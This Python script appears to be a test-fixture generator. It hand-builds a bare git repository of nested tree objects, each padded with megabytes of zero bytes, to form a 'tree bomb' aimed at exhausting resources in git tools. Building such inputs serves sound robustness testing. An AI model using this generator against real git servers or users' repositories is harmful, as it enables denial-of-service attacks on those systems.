import hashlib, os, sys, zlib

root, levels, pad_mib = sys.argv[1], int(sys.argv[2]), int(sys.argv[3])
name = f"treebomb{levels}"
g = os.path.join(root, name, ".git")
for sub in ("objects", "refs/heads"):
    os.makedirs(os.path.join(g, sub), exist_ok=True)
with open(os.path.join(g, "HEAD"), "w") as f:
    f.write("ref: refs/heads/main\n")
with open(os.path.join(g, "config"), "w") as f:
    f.write("[core]\n\trepositoryformatversion = 0\n\tbare = true\n")


def write_tree(content):
    raw = b"tree %d\0" % len(content) + content
    oid = hashlib.sha1(raw).digest()
    hexid = oid.hex()
    d = os.path.join(g, "objects", hexid[:2])
    os.makedirs(d, exist_ok=True)
    with open(os.path.join(d, hexid[2:]), "wb") as f:
        f.write(zlib.compress(raw, 1))
    return oid


# innermost: one blob entry (never loaded), then wrap with trees that start with a subtree entry
child = write_tree(b"100644 f\0" + bytes([0x44] * 20))
for _ in range(levels):
    child = write_tree(b"40000 d\0" + child + bytes(pad_mib * 1024 * 1024))
with open(os.path.join(g, "refs/heads/tree"), "w") as f:
    f.write(child.hex() + "\n")
print(name)
